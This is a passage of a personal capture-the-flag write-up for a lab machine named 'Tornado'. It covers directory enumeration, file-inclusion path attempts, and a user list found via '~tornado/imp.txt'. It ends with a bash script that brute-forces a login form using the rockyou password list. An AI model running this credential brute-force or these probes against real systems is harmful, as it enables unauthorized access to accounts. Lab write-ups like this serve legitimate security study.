|Machine Name|Difficulty|OS|
|-|-|-|
|Tornado|Medium|GNU/Linux|

## reconnaissance

![image](https://iili.io/HtSpCHx.png)

if you look at the picture above, there are 22/tcp and 80/tcp. our target scope includes both of these ports.

i attempted to brute force the directories on port 80 to learn more about which directories we should investigate. this time, i used gobuster because feroxbuster and dirsearch didn't detect anything at all, and the results were consistently the same: quite strange.

![image](https://iili.io/HtSpLbV.png)

i found the 'bluesky' directory. and i was trying the same approach as before to gather interesting information within the 'bluesky' directory.

![image](https://iili.io/HtSyYB9.png)

as suggested by [@laztname](https://potato.id/), i've been told to record all web activities in Burp Suite to capture interesting things that need further investigation. so, lets fire up then!

## 80/tcp testing

before that, since I found 'login.php' and 'signup.php' earlier, i went ahead and conducted testing on that web.

i registered with the credentials 'admina' and password 'admina'. then, I received a regular messagebox like this.

![image](https://iili.io/HtU9bSa.png)

after that, I returned to 'login.php' to log in as usual using the created credentials. then i received a message like this.

![image](https://iili.io/HtUHExV.png)

![image](https://iili.io/HtUd6Nf.png)

i explored all the tabs present in the image above, and when i reached `port.php`, i found a commented tag within its HTML source, as shown in the image below.

![image](https://iili.io/HtU2nRa.png)

however, I became suspicious when the webpage displayed text like this.

![image](https://iili.io/HtU2lOG.png)

there's LFI inside! but how?

i tried testing everything, and this is the payload i used.

```
http://192.168.100.16/bluesky/home/tornado/imp.txt 
http://192.168.100.16/home/tornado/imp.txt
http://192.168.100.16/bluesky/../../../../../../../home/tornado/imp.txt
```
i've tried everything, even read through the hackerone reports, but nothing led me to LFI. it's really strange. Then i gave up and looked at a writeup, and it turned out i just needed to add `/~tornado/imp.txt`. weird.

the contents of imp.txt are as shown in the image below.

![image](https://iili.io/HtUFwtj.png)

i've created a script to brute force the password for those usernames using the rockyou dictionary, but nothing seems to work. perhaps it's taking too long? im not sure.

```sh
#! /bin/env bash

users="./imp.txt"
passwords="/opt/seclists/Passwords/Leaked-Databases/rockyou.txt"
breakY=false

function main() {
  for user in $(cat $users); do
    for password in $(cat $passwords); do
      brute=$(curl -s -X POST http://192.168.100.16/bluesky/login.php -d "uname=$user&upass=$password&btn=Login" -o /dev/null -L -w %{s
ize_download})
      echo -ne "user: $user\npass: $password\n"
      if [[ "$brute" -ne "878" ]]; then
        echo -ne "[+] Found!\n[+] User: $user\n[+] Password: $password\n" >> found.txt
        break
      fi
    done
  done
  cat found.txt
}

main
```

i only found two passwords, prolly because it took too long.

![img](https://iili.io/HtUFyRn.png)
